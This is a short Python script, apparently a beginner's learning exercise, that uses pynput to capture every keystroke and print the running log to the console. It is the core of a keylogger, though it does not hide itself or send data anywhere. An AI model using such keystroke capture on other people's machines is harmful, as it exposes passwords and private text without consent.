import pynput.keyboard

content = ""        # declaring a global variable and storing all information in it

def process_key_strike(key):
    global content                      	# we have to tell that in this function we are trying to use global variable called "log"
    try:                               		# otherwise it would have created a local variable log
        content = content + str(key.char)       # key.char ==>  char is used to print only the pressed character otherwise this used to be printed  ==> 'u't
    except AttributeError:              	# NOTE: this char keyword we found from the python module
        if key == key.space:
            content = content + " "
        else:
            content = content + " " + str(key) + " "
    print(content)

keyboard_listener = pynput.keyboard.Listener(on_press=process_key_strike)
with keyboard_listener:
    keyboard_listener.join()